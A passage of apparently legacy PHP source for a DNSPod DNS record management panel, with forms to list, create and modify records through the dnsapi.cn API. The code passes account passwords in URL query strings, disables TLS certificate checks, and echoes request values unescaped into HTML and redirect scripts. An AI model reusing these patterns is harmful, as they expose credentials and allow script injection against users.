                if (fmod($totalitem, $pagesize) == 0){
                        $totalpage=$totalitem/$pagesize;
                }       
                else{
                        $totalpage=ceil($totalitem/$pagesize);
                }       
                ?>
        <tr class="tdbg">
                <td align="center" width=4%>
                        <input type="checkbox" id="allitem" name="allitem" value="" onclick="javascript:selitemall();" />
                </td>   
                <td align="center" width=17%>
                        记录值
                </td>
                <td align="center" width=10%>
                        线路
                </td>
                <td align="center" width=10%>
                        类型
                </td>
                <td align="center" width=5%>
                        MX
                </td>
                <td align="center" width=10%>
                        TTL
                </td>
                <td align="center" width=23%>
                        记录值
                </td>
                <td align="center" width=30%>
                        <a style="color:#444444" href="<?php  echo ScriptPath()?>?api=dnspod&action=<?php echo encodeuri("Record.Create");?>&skin=<?php echo $skincolor?>&uname=<?php echo encodeuri(trim(request("uname")))?>&pwd=<?php echo encodeuri(trim(request("pwd")))?>&domainid=<?php echo trim(request("domainid"))?>&topdomain=<?php echo encodeuri(trim(request("topdomain")))?><?php echo "&pagesize=".trim(request("pagesize"))."&page=".$page."&grade=".encodeuri(trim(request("grade")))?>">添加</a> 搜索 <a style="color:#444444" href="javascript:delitem();">删除</a> <a style="color:#444444" href="javascript:doitem('enable');">启</a>/<a style="color:#444444" href="javascript:doitem('disable');">停</a>
                </td> 
        </tr>   
                <?php 
                for($i = 0;$i <= $strpagesize-1;$i++){
                        $objHdd = $objList->item($i);
                        ?>
        <tr class="tdbg">
                <td align="center">
                        <input type="checkbox" name="chidd<?php echo $i;?>" id="chidd<?php echo $i;?>" value="chidd<?php echo $i;?>" />
                </td>   
                <td align="center"%>
                        <?php 
                        $recordid = $objHdd->getElementsByTagName('id')->item(0)->nodeValue;
                        $recordname = $objHdd->getElementsByTagName('name')->item(0)->nodeValue;
                        $recordtype = $objHdd->getElementsByTagName('type')->item(0)->nodeValue;
                        $recordline = iconv('utf-8','gb2312',$objHdd->getElementsByTagName('line')->item(0)->nodeValue);
                        $recordttl = $objHdd->getElementsByTagName('ttl')->item(0)->nodeValue;
                        $recordvalue = $objHdd->getElementsByTagName('value')->item(0)->nodeValue;
                        $recordmx = $objHdd->getElementsByTagName('mx')->item(0)->nodeValue;
                        $recordenabled = $objHdd->getElementsByTagName('enabled')->item(0)->nodeValue;
                        $recordtime = $objHdd->getElementsByTagName('updated_on')->item(0)->nodeValue;

                        if (preg_match("/[^@]/i", $recordname) && preg_match("/(?:CNAME|NS|A)/i", $recordtype) && $recordenabled == 1)
                                echo "<a style='color:#444444' href='http://".$recordname.".".trim(request("topdomain"))."' target='_blank'>".$recordname."</a>";
                        elseif (preg_match("/[@]/i", $recordname) && preg_match("/(?:CNAME|NS|A)/i", $recordtype) && $recordenabled == 1)       
                                echo "<a style='color:#444444' href='http://".trim(request("topdomain"))."' target='_blank'>".$recordname."</a>";
                        else
                                echo " ".$recordname." ";
                ?>
                </td>
                <td align="center">
                        <?php echo $recordline?>
                </td>
                <td align="center">
                        <?php echo $recordtype?>
                </td>
                <td align="center">
                        <?php echo $recordmx?>
                </td>
                <td align="center">
                        <?php echo $recordttl?>
                </td>
                <td align="center">
                        <?php echo $recordvalue?>
                </td>
                <td align="center"><a href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Modify")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".encodeuri(trim(request("domainid")))."&record_id=".$recordid."&sub_domain=".encodeuri($recordname)."&record_type=".$recordtype."&record_line=".$recordline."&value=".encodeuri($recordvalue)."&mx=".$recordmx."&ttl=".$recordttl."&edit=1&topdomain=".encodeuri(trim(request("topdomain")))."&grade=".encodeuri(trim(request("grade")));?>" style="color:#444444">修改</a> <a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Remove")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">删除</a> <?php  if ($recordenabled == "1"){?><a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=disable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])."&topdomain=".encodeuri(trim(request("topdomain")));?>">停用</a><?php }else{?><a style="color:#444444" href="<?php echo ScriptPath()."?"."api=dnspod&action=".encodeuri("Record.Status")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domain_id=".trim(request("domainid"))."&record_id=".$recordid."&status=enable&refer=".encodeuri(httpPath()."?".$_SERVER['QUERY_STRING'])?>">启用</a><?php }?> 监控</td>
        </tr>   
                <?php 
                }
                ?>
                </td>
        </tr>   
</table>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdbg">
                <td align="center" colspan="3"> 共 <?php  echo $totalpage;?> 页 第  
                <?php 
                echo $page." 页 ".$sCrLf;
                if (floor($page)>1)
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page-1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>上一页</a> ";
                if (floor($page)>0 && floor($page)<floor($totalpage))
                        echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=".($page+1)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>下一页</a> ";
                				
                				?>
                				<input name="page" value="<?php  echo $page; ?>" style="height:20px;width:40px;font-size:11px;" <?php  $style->input("#FCFC9D",""); ?>>
												<input type="submit" class="button" name="gotopage" value=" Go ">                 
                				<?php 

                //$gotopage = New PageChange();
                //$gotopage->CallPageChange();
                ?>
                </td>
        </tr>   
</table>
<?php 
                //$gotopage->gotopage($totalpage,ScriptPath()."?api=dnspod&action=".encodeuri(trim(request("action")))."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".encodeuri($pagesize)."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."&gopage=ok&page=","请输入要转到的页数","请在空白处输入要转到的页数");
                break;   // action - Record.List end    
        case "Record.Create": // action - Record.Create start
                if (trim(request("record_type")) == "" || trim(request("record_line")) == "" || trim(request("value")) == ""){
?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domainid"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
        </tr>
</table>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="50">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=dnspod&domainid=<?php echo trim(request("domainid"))?>&action=<?php echo encodeuri("Record.Create");?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&topdomain=".encodeuri(trim(request("topdomain")))."&skin=".$skincolor?>" method="post" name="dnspod">
                        &nbsp记录名：<input type="text" class="text" name="sub_domain" value="" style="height:20px;width:15%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
                        <SELECT name="record_type" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record type success.</message>'.
                                                '<created_at>2010-10-07 14:52:43</created_at>'.
                                                '</status>'.
                                                '<types>'.
                                                '<item>A</item>'.
                                                '<item>CNAME</item>'.
                                                '<item>MX</item>'.
                                                '<item>TXT</item>'.
                                                '<item>URL</item>'.
                                                '<item>NS</item>'.
                                                '<item>AAAA</item>'.
                                                '</types>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Type";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }
                                                
                        //echo $xmlstr;
                        //return;
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_type = $record_type.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_type = $record_type.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //echo $record_type;
                        //return;
                        //$record_type = "A,CNAME,MX,TXT,URL,NS,AAAA";
                        //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;

                        for ($record_typei = 0;$record_typei < count(split("[,]",$record_type));$record_typei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split("[,]",$record_type),($record_typei))?>" <?php if(trim(request("record_type"))==arrmember(split("[,]",$record_type),$record_typei)) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_type),($record_typei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        <SELECT name="record_line" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record line success.</message>'.
                                                '<created_at>2010-10-07 14:56:40</created_at>'.
                                                '</status>'.
                                                '<lines>'.
                                                '<item><![CDATA[默认]]></item>'.
                                                '<item><![CDATA[电信]]></item>'.
                                                '<item><![CDATA[网通]]></item>'.
                                                '<item><![CDATA[教育网]]></item>'.
                                                '<item><![CDATA[移动]]></item>'.
                                                '<item><![CDATA[铁通]]></item>'.
                                                '<item><![CDATA[国外]]></item>'.
                                                '</lines>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Line";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }

                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_line = $record_line.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_line = $record_line.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //$record_line = "默认,电信,网通,教育网,移动,铁通,国外";
                        for ($record_linei = 0; $record_linei < count(split("[,]",$record_line));$record_linei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split(",",$record_line),($record_linei))?>" <?php if (trim(request("record_line"))==arrmember(split("[,]",$record_line),($record_linei))) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_line),($record_linei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        &nbsp记录值：<input type="text" class="text" name="value" value="" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbspMX优先级：<input type="text" class="text" name="mx" value="" style="height:20px;width:5%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbspTTL：<input type="text" class="text" name="ttl" value="" style="height:20px;width:5%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                        <input type="hidden" class="text" name="refer" value="<?php echo trim($_SERVER['HTTP_REFERER'])?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php               }
                else{
                        
                        if (preg_match("/(?:([\w]*[.])*[\w]*)/i", trim(request("sub_domain")))) {
                        }
                        else{   
                                AlertBack ("记录或记录值格式错误！" , 2);
                        }       
                }
                if (trim(request("record_type")) != "A" && trim(request("record_type")) != "URL")
                        $rvalue = trim(request("value")).".";
                else
                        $rvalue = trim(request("value"));
                if (trim(request("mx")) == "")  
                        $rmx = "10";
                elseif (trim(request("mx")) > "20")
                        $rmx = "20";
                elseif (trim(request("mx")) < "0")
                        $rmx = "1";
                else
                        $rmx = trim(request("mx"));
                if (trim(request("ttl")) == "")
                        $rttl = "600";
                elseif (trim(request("ttl")) > "604800")
                        $rttl = "604800";
                elseif (trim(request("ttl")) < "0")
                        $rttl = "1";
                else
                        $rttl = trim(request("ttl"));
                //echo trim(request("record_line"));
                //return;       
                if (trim(request("record_type")) != "" && trim(request("record_line")) != "" && trim(request("value")) != ""){
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Record created success</message>'.
                                                '<created_at>2008-11-26 16:12:00</created_at>'.
                                                '</status>'.
                                                '<record>'.
                                                '<id>419616</id>'.
                                                '<name>test1163078446</name>'.
                                                '</record>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Create";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_id' => trim(request("domainid")),
                                        'sub_domain' => trim(request("sub_domain")),
                                        'record_type' => trim(request("record_type")),
                                        'record_line' => iconv('gb2312','UTF-8',trim(request("record_line"))),
                                        'value' => $rvalue,
                                        'mx' => $rmx,
                                        'ttl' => $rttl,
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);                              

                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue !== true){
                        }
                        elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1")
                                AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 2);
                }
                                
                if (trim(request("sub_domain")) == "" || trim(request("record_type")) == "" || trim(request("record_line")) == "" || trim(request("value")) == ""){
                }
                else{   
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);                              

                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == '1'){
                        }
                        elseif ($objXml->getElementsByTagName("code")->item(0)->nodeValue != "1"){
                                //AlertBack ($objXml->getElementsByTagName("message")->item(0)->nodeValue , 1);
                        }        
                        if ($objXml->getElementsByTagName("code")->item(0)->nodeValue == "1"){
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名添加成功！子域名ID：<?php echo $objXml->getElementsByTagName("id")->item(0)->nodeValue?> 实际子域名记录：<?php echo $objXml->getElementsByTagName("name")->item(0)->nodeValue." <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php               
                        }
                        else{
                                $timeout = "5000";
                ?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="center"> 操 作 结 果 </td>
        </tr>
        <tr class="tdbg">
                <td align="center" id="result">
                子域名添加失败！原因<?php echo $objXml->getElementsByTagName("message")->item(0)->nodeValue?> <?php echo " <br>".($timeout/1000)?> 秒后返回上一页
                </td>
        </tr>   
        <?php 
                                echo "<p align=center><script>window.setTimeout(\"location.href=\'".urldecode(trim(request("refer")))."\'\",".$timeout.");</script></p>";
        ?>
</table>                        
        <?php               
                        
                        }
                }
                break;   // action - Record.Create end
        case "Record.Modify": // action - Record.Modify start
                if (trim(request("edit")) == "1"){
?>
<table width="95%" align="center" cellspacing="1" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg">
                <td align="left" colspan="3" width="100%">&nbsp; [ <a style="color:#444444" href="<?php echo ScriptPath()."?api=dnspod&action=".encodeuri("Domain.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".$pagesize."&page=1&skin=".$skincolor;?>" target=_self>用户</a> - <?php echo $dnspoduname;?> ] >> <?php  echo "<a style='color:#444444' href='".ScriptPath()."?api=dnspod&action=".encodeuri("Record.List")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&pagesize=".trim(request("pagesize"))."&page=".$page."&skin=".$skincolor."&domainid=".trim(request("domain_id"))."&topdomain=".encodeuri(trim(request("topdomain")))."'>".trim(request("topdomain"))."</a>";?>  </td>
        </tr>
</table>
<script>
function changeimg()
{
 document.getElementById("ccimg").src = '<?php echo ScriptPath()?>?api=checkcode&a=' + Math.random();
}
</script>               
<table width="95%" align="center" cellspacing="0" cellpadding="0" bgcolor="#FFFFFF" class="tborder">
        <tr class="tdtbg" height="50">
                <td align="center">
                        <form action="<?php echo ScriptPath()?>?api=dnspod&domain_id=<?php echo trim(request("domain_id"))?>&record_id=<?php echo trim(request("record_id"))?>&action=<?php echo encodeuri("Record.Modify")?>&pagesize=<?php echo encodeuri($pagesize)."&page=".encodeuri("1")."&uname=".encodeuri(trim(request("uname")))."&pwd=".encodeuri(trim(request("pwd")))."&skin=".$skincolor?>" method="post" name="dnspod">
                        &nbsp记录名：<input type="text" class="text" name="sub_domain" value="<?php echo trim(request("sub_domain"))?>" style="height:20px;width:15%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
                        <SELECT name="record_type" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record type success.</message>'.
                                                '<created_at>2010-10-07 14:52:43</created_at>'.
                                                '</status>'.
                                                '<types>'.
                                                '<item>A</item>'.
                                                '<item>CNAME</item>'.
                                                '<item>MX</item>'.
                                                '<item>TXT</item>'.
                                                '<item>URL</item>'.
                                                '<item>NS</item>'.
                                                '<item>AAAA</item>'.
                                                '</types>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Type";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }
                                                
                        //echo $xmlstr;
                        //return;
                        
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_type = $record_type.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_type = $record_type.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //echo $record_type;
                        //return;
                        //$record_type = "A,CNAME,MX,TXT,URL,NS,AAAA";
                        //echo $objXml->getElementsByTagName("record_total")->item(0)->nodeValue;
                        
                        //$record_type = "A,CNAME,MX,TXT,URL,NS,AAAA";
                        for ($record_typei = 0;$record_typei < count(split("[,]",$record_type));$record_typei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split("[,]",$record_type),($record_typei))?>" <?php if(trim(request("record_type"))==arrmember(split("[,]",$record_type),$record_typei)) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_type),($record_typei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        <SELECT name="record_line" size="1" <?php  $style->selectarea("#FCFC9D","") ?> style="width:10%;height:16px;font-size:12px">
                        <?php 
                        if (0){
                                $xmlstr = '<?php xml version="1.0" encoding="UTF-8"?>'.
                                                '<dnspod>'.
                                                '<status>'.
                                                '<code>1</code>'.
                                                '<message>Get record line success.</message>'.
                                                '<created_at>2010-10-07 14:56:40</created_at>'.
                                                '</status>'.
                                                '<lines>'.
                                                '<item><![CDATA[默认]]></item>'.
                                                '<item><![CDATA[电信]]></item>'.
                                                '<item><![CDATA[网通]]></item>'.
                                                '<item><![CDATA[教育网]]></item>'.
                                                '<item><![CDATA[移动]]></item>'.
                                                '<item><![CDATA[铁通]]></item>'.
                                                '<item><![CDATA[国外]]></item>'.
                                                '</lines>'.
                                                '</dnspod>';
                        }       
                        else{   
                                $ch = curl_init();
                                $url = "https://dnsapi.cn/Record.Line";
                                $data = array(
                                        'login_email' => $dnspoduname,
                                        'login_password' => $dnspodpwd,
                                        'domain_grade' => trim(request("grade")),
                                        'format' => 'xml'
                                );
                                $ch = curl_init();
                                curl_setopt($ch, CURLOPT_URL, $url);
                                curl_setopt($ch, CURLOPT_HEADER, 0);
                                curl_setopt($ch, CURLOPT_POST, 1);
                                curl_setopt($ch, CURLOPT_POSTFIELDS, $data);
                                curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
                                curl_setopt($ch, CURLOPT_USERAGENT, "X3193 DDNS Client/1.1 (".$dnspoduname.")");
                                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
                                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, 0);    
                                curl_setopt($ch, CURLOPT_TIMEOUT, 50);
                                $xmlstr = curl_exec($ch);
                                curl_close($ch);
                        }       

                        while(strpos($xmlstr, '<![CDATA[')){
                                $xmlstr = preg_replace("/(.*)(\<\!\[CDATA\[)(.*)(\]\]\>)(.*)/", "\$1\$3\$5", $xmlstr);
                        }

                        //echo $xmlstr;
                        $objXml = new DOMDocument();  
                        $objXml->preserveWhiteSpace = true;
                        $objXml->async = false; 
                        $objXml->loadXML($xmlstr);
                        $objList = $objXml->getElementsByTagName("item");               
                        $record_type = "";
                        for($i=0;$i<$objList->length;$i++){
                                if ($i=='0'){
                                        $record_line = $record_line.iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                                else{
                                        $record_line = $record_line.",".iconv('UTF-8','gb2312',$objList->item($i)->nodeValue);
                                }
                        }
                        //$record_line = "默认,电信,网通,教育网,移动,铁通,国外";
                        for ($record_linei = 0; $record_linei < count(split("[,]",$record_line));$record_linei++){
                        ?>
                                <OPTION VALUE="<?php echo arrmember(split(",",$record_line),($record_linei))?>" <?php if (trim(request("record_line"))==arrmember(split("[,]",$record_line),($record_linei))) {?>selected<?php }?>><?php echo arrmember(split("[,]",$record_line),($record_linei))?></OPTION>
                        <?php 
                        }
                        ?>
                        </SELECT>
                        &nbsp记录值：<input type="text" class="text" name="value" value="<?php echo trim(request("value"))?>" style="height:20px;width:15%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbspMX优先级：<input type="text" class="text" name="mx" value="<?php echo trim(request("mx"))?>" style="height:20px;width:5%;font-size:11px;" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbspTTL：<input type="text" class="text" name="ttl" value="<?php echo trim(request("ttl"))?>" style="height:20px;width:5%;font-size:11px" <?php  $style->input("#FCFC9D","") ?>>  
                        &nbsp验证码：<input maxlength="4" <?php  $style->input("#FCFC9D","") ?> name="checkcode" id="checkcode" maxlength="4" class="text" type="text" size="7">&nbsp;<a href="javascript:changeimg()" title="看不清楚？换一个！"><IMG id="ccimg" height="14.5" src="<?php echo ScriptPath()?>?api=checkcode" border="0"></a>
                        <input type="hidden" class="text" name="skin" value="<?php echo $skincolor?>"> 
                        <input type="hidden" class="text" name="refer" value="<?php echo encodeuri(trim($_SERVER['HTTP_REFERER']))?>"> 
                        &nbsp<input type="submit" class="button" name="docinSubmit" value=" Go ">
                </td>   
        </tr>
</table>        
<?php               }
                else{
                        
                        if (preg_match("/(?:([\w]*[.])*[\w]*)/i", trim(request("sub_domain")))) {
                        }
                        else{   
                                //echo trim(request("sub_domain"));
